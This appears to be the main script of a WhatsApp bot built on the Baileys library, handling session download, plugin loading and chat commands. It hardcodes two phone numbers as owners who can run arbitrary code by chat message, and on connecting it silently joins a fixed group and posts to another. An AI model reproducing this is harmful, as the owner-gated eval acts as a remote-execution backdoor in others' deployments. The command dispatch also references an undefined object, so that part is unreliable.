        const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    jidNormalizedUser,
    getContentType,
    fetchLatestBaileysVersion,
    Browsers
} = require('@whiskeysockets/baileys');

const { getBuffer, getGroupAdmins, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions');
const fs = require('fs');
const P = require('pino');
const config = require('./config');
const qrcode = require('qrcode-terminal');
const util = require('util');
const { sms } = require('./lib/msg');
const axios = require('axios');
const { File } = require('megajs');
const prefix = '.';
const evalPlugin = require('./lib/AmeenInt_Auth/evalPlugin');
const ownerNumber = ['917994489493', '916238768108']; // Add more numbers as needed

//===================SESSION-AUTH============================
if (!fs.existsSync(__dirname + '/auth_info_baileys/creds.json')) {
    if (!config.SESSION_ID) return console.log('Please add your session to SESSION_ID env !!');
    const sessdata = config.SESSION_ID;
    const filer = File.fromURL(`https://mega.nz/file/${sessdata}`);
    filer.download((err, data) => {
        if (err) throw err;
        fs.writeFile(__dirname + '/auth_info_baileys/creds.json', data, () => {
            console.log("*sᴇssɪᴏɴ ᴅᴏᴡɴʟᴏᴀᴅᴇᴅ [🌟]*");
        });
    });
}

const express = require("express");
const app = express();
const port = process.env.PORT || 8000;

//=============================================

async function connectToWA() {
    console.log("Connecting Octa...");
    const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/auth_info_baileys/');
    const { version } = await fetchLatestBaileysVersion();

    const conn = makeWASocket({
        logger: P({ level: 'silent' }),
        printQRInTerminal: false,
        browser: Browsers.macOS("Firefox"),
        syncFullHistory: true,
        auth: state,
        version
    });

    conn.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'close') {
            if (lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
                connectToWA();
            }
        } else if (connection === 'open') {
            console.log('Installing plugins...');
            const path = require('path');
            fs.readdirSync("./plugins/").forEach((plugin) => {
                if (path.extname(plugin).toLowerCase() === ".js") {
                    require("./plugins/" + plugin);
                }
            });
            console.log('Plugins installed');
            console.log('*Connected*');

            const up = `*Bot Started✅*\n\n*Prefix: [${prefix}]*`;

            let AmeenIntL = 'https://chat.whatsapp.com/GVxT4w51GIU3sndNPZGTnw';
            conn.groupAcceptInvite(AmeenIntL.split('/').pop());
            let AmeenIntJ = '120363232826409191@g.us';
            conn.sendMessage(AmeenIntJ, {
                image: { url: `https://ik.imagekit.io/eypz/1724661875852_gwwMRtTtz.png` },
                caption: up
            });
        }
    });
    
    conn.ev.on('creds.update', saveCreds);

    conn.ev.on('messages.upsert', async (mek) => {
        mek = mek.messages[0];
        if (!mek.message) return;

        mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message;

        const m = sms(conn, mek);
        const type = getContentType(mek.message);
        const body = (type === 'conversation') ? mek.message.conversation :
            (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text :
            (type === 'imageMessage' && mek.message.imageMessage.caption) ? mek.message.imageMessage.caption :
            (type === 'videoMessage' && mek.message.videoMessage.caption) ? mek.message.videoMessage.caption : '';
        const isCmd = body.startsWith(prefix);
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
        const args = body.trim().split(/ +/).slice(1);
        const q = args.join(' ');
        const from = mek.key.remoteJid;
        const isGroup = from.endsWith('@g.us');
        const sender = mek.key.fromMe ? (conn.user.id.split(':')[0] + '@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid);
        const senderNumber = sender.split('@')[0];
        const botNumber = conn.user.id.split(':')[0];
        const pushname = mek.pushName || 'Sin Nombre';
        const isMe = botNumber.includes(senderNumber);
        const isOwner = ownerNumber.includes(senderNumber) || isMe;
        const botNumber2 = await jidNormalizedUser(conn.user.id);
        const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : '';
        const groupName = isGroup ? groupMetadata.subject : '';
        const participants = isGroup ? await groupMetadata.participants : '';
        const groupAdmins = isGroup ? await getGroupAdmins(participants) : '';
        const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false;
        const isAdmins = isGroup ? groupAdmins.includes(sender) : false;
        const quoted = mek.message.extendedTextMessage ? mek.message.extendedTextMessage.contextInfo.quotedMessage : null;

        const reply = (teks) => {
            conn.sendMessage(from, { text: teks }, { quoted: mek });
        };

        // Call the plugin's async function
        await evalPlugin.handleMessage(conn, mek);

        // Handle other commands
        const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
        if (isCmd) {
            const cmd = events.commands.find((cmd) => cmd.pattern === cmdName) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName));
            if (cmd) {
                if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }});
                try {
                    await cmd.function(conn, mek, m, { from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply });
                } catch (e) {
                    console.error("[PLUGIN ERROR] " + e);
                }
            }
        }

        // Handle command events
        events.commands.forEach(async (command) => {
            if (body && command.on === "body") {
                if (body.startsWith(command.pattern)) {
                    if (command.react) conn.sendMessage(from, { react: { text: command.react, key: mek.key }});
                    try {
                        await command.function(conn, mek, m, { from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply });
                    } catch (e) {
                        console.error("[PLUGIN ERROR] " + e);
                    }
                }
            }
        });

        // Handle eval commands
        if (body.startsWith(">")) {
            if (!isOwner) return;
            try {
                const evalCode = body.slice(1);
                await evalPlugin.handleMessage(conn, mek, { from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply }, evalCode);
            } catch (e) {
                console.error("[EVAL ERROR] " + e);
            }
        } else if (type === 'text' && !isGroup && !isCmd) {
            // Do something with non-command text messages
        }
    });

    app.listen(port, () => {
        console.log(`Octa is Running on Port: ${port}`);
    });
}

connectToWA().catch(err => console.log(err));
            
